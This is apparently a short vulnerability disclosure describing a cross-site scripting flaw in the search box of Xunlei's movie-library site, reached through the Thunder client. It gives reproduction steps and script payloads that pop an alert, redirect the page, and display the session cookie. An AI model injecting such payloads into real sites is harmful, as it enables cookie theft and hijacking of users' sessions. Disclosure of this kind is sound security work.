Install the latest version of thunder. On his home page, you can view some movie from a buttom named "影视库". Then you'll find that is redirect to https://yingshiku.xunlei.com/.   

![avatar](home.png)  

So open the link:https://yingshiku.xunlei.com/ 
There is a serach box in this link, which existed XSS vulnerability.  
just enter like: <script>alert(1)</script>  

![avatar](1.png)  

or enter: <script>window.location="http://www.baidu.com"</script>  OR   <script>alert(document.cookie)/script>
![avatar](cookie.png)  
